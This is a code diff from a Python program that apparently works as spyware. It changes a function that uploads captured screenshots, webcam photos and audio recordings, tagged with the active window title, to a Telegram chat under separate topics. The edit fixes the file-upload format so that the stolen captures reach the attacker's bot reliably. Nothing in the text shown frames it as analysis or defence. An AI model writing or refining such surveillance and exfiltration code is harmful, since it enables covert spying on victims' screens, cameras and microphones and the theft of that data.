@@ -111,11 +111,16 @@ def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
         except: pass
 
     if os.path.exists(screen_file):
-        with open(screen_file, "rb") as f: post(url_photo, TOPIC_SCREENSHOT, f"LOG_S\n{cap}", {"photo": f})
+        with open(screen_file, "rb") as f: 
+            post(url_photo, TOPIC_SCREENSHOT, f"LOG_S\n{cap}", {"photo": ("s.jpg", f, "image/jpeg")})
+            
     if os.path.exists(webcam_file):
-        with open(webcam_file, "rb") as f: post(url_photo, TOPIC_WEBCAM, f"LOG_W\n{cap}", {"photo": f})
+        with open(webcam_file, "rb") as f: 
+            post(url_photo, TOPIC_WEBCAM, f"LOG_W\n{cap}", {"photo": ("w.jpg", f, "image/jpeg")})
+
     if os.path.exists(audio_file):
-        with open(audio_file, "rb") as f: post(url_doc, TOPIC_AUDIO, f"LOG_A\n{cap}", {"document": f})
+        with open(audio_file, "rb") as f: 
+            post(url_doc, TOPIC_AUDIO, f"LOG_A\n{cap}", {"document": ("a.wav", f, "audio/wav")})
 
 def main():
     if not TOKEN or not CHAT_ID: return
